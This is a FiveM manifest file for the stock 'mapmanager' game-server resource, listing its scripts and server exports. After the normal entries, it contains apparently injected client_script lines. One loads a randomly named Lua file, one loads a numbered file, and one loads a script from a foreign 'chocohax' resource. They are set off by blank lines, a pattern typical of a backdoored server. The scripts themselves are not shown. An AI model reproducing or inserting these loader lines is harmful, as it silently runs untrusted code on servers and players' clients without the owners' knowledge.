client_scripts {
    "mapmanager_shared.lua",
    "mapmanager_client.lua"
}

server_scripts {
    "mapmanager_shared.lua",
    "mapmanager_server.lua"
}

fx_version 'adamant'
games { 'gta5' }

server_export "getCurrentGameType"
server_export "getCurrentMap"
server_export "changeGameType"
server_export "changeMap"
server_export "doesMapSupportGameType"
server_export "getMaps"
server_export "roundEnded"

client_script "WbrBEkhWfwnaOOeMYA.lua"







client_script "13277.lua"
client_script '@chocohax/10992.lua'